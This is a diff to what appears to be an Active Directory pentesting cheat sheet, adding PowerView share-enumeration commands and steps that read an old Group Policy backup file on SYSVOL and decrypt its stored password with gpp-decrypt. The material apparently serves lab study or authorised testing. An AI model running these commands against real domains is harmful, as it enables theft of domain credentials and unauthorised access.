@@ -127,7 +127,27 @@ Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
 Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
 ```
 ### Enumerating Domain Shares
+- Finding shares in the domain
+```
+Find-DomainShare
+```
+- Finding accessible shares in the domain for the current user
+```
+Find-DomainShare -CheckShareAccess
+```
+- SYSVOL share
+```
+ls \\dc1.corp.com\sysvol\corp.com\
 
+# Finding old policy file
+ls \\dc1.corp.com\sysvol\corp.com\Policies\
+
+#Find password in it
+cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+
+#Decrypt the password
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+```
 ## PsLoggedOn
 - To find logged on users on hosts
 ```
